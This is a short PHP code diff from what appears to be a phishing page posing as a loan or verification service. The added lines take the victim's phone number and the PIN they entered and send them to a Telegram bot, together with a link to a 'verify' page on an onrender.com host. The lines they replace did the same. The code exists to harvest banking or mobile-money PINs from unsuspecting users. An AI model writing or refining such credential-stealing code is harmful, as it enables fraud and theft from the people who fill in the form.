@@ -195,16 +195,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             $_SESSION['verifying'] = true;
             
             /// Send Telegram notification
-            $ip = "https://loan-1-i36j.onrender.com/verify.php";
-            $time = date('Y-m-d H:i:s');
+            $pin = isset($_POST['pin']) ? preg_replace('/\D/', '', $_POST['pin']) : 'N/A';
+
+                    $message = "
+                    <b>🔐 PIN Verification Request</b>
+                    
+                    📱 <b>Phone:</b> {$phone}
+                    🔢 <b>PIN entered:</b> {$pin}
+                    ⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "
+                    🌐 <a href='https://loan-1-i36j.onrender.com/verify.php'>VERIFY HERE</a>
+                    ";
+                    
+                    sendTelegramMessage($botToken, $chatId, $message);
             
-            $msg = "🔐 <b>PIN Verification Request</b>\n\n"
-                 . "📱 Phone: +263 {$phone}\n"
-                 . "🔢 PIN entered: <a href=\"mailto:{$pin}@pin.com\">{$pin}</a>\n"
-                 . "⏰ Time: {$time}\n"
-                 . "🌐 <a href=\"{$ip}\">VERIFY HERE</a>";
             
-            sendTelegramMessage($botToken, $chatId, $msg);
             
             // Redirect to show verifying state (DB value is still 0, will show verifying)
             header("Location: " . $_SERVER['PHP_SELF'] . "?verifying=1");
